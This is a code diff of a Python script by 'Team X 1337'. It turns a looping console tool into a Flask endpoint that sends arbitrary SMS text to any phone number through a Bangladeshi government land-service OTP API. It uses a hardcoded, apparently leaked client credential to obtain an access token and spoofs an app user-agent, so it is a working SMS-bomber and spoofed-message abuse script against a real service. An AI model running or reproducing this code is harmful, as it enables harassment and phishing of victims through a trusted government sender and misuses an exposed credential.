@@ -1,49 +1,58 @@
 import requests
 from pprint import pprint
-
-for _ in range(50):
-    n = input("Enter Your Number    :> ")
-    m = input("Enter Your Message   :> ")
-    print("\n")
+from flask import Flask, request
+app = Flask(__name__)
+@app.route('/')
+def send_otp():
+    n = request.args.get('n')
+    m = request.args.get('m')
+    if not n:
+        return {"error":"Please Enter Number!"}
+    if not m:
+        return {"error":"Please Enter Message!"}
 
     tAPI = "https://idp.land.gov.bd/auth/realms/prod/protocol/openid-connect/token"
 
-    headers = {
-        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",
+    token_headers = {
+        "user-agent": "Dart/3.2 (dart:io)",
         "content-type": "application/x-www-form-urlencoded; charset=utf-8",
         "accept-encoding": "gzip",
-        "content-length": "29",
         "authorization": "Basic bXV0YXRpb24tYXBwLWNsaWVudDphWTBBNVhFdlpLZHNwOGJzM0ZKNklwa0l4TmJWcHpGNg==",
         "host": "idp.land.gov.bd"
     }
-    data = {
+    token_data = {
         "grant_type": "client_credentials"
     }
-
-    resp = requests.post(tAPI, headers=headers, data=data).json()
-    token = resp['access_token']
+    token_resp = requests.post(tAPI, headers=token_headers, data=token_data)
+    token_resp.raise_for_status()  # Raise exception for HTTP errors
+    token = token_resp.json().get('access_token')
 
     mAPI = "https://sms-api.land.gov.bd/api/broker-service/otp/send_otp"
-    headers = {
-        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",
+    otp_headers = {
+        "user-agent": "Dart/3.2 (dart:io)",
         "accept": "application/json",
         "accept-encoding": "gzip",
-        "content-length": "112",
         "host": "sms-api.land.gov.bd",
         "authorization": f"Bearer {token}",
         "content-type": "application/json; charset=utf-8"
     }
-    data = {
+    otp_data = {
         "msgTmp": f"{m} $code",
         "destination": f"{n}",
         "otpType": "sms",
         "otpLength": 0
     }
+    
+    #Coded By Team X 1337
 
-    response = requests.post(mAPI, headers=headers, json=data).json()
-
-    if response['success'] == True and response['status'] == 200:
-        print(f"SMS sent to {n} !!")
+    otp_resp = requests.post(mAPI, headers=otp_headers, json=otp_data)
+    otp_resp.raise_for_status()
+    response = otp_resp.json()
+    
+    if response.get('success') and response.get('status') == 200:
+        return {"msg":f"SMS sent to {n} successfully!", "Developer":"Team X 1337"}
     else:
-        print("SMS send Failed !")
-        pprint(response)
+        return {"error":"Failed To Send Sms!", "Developer":"Team X 1337"}
+
+if __name__ == "__main__":
+    app.run()
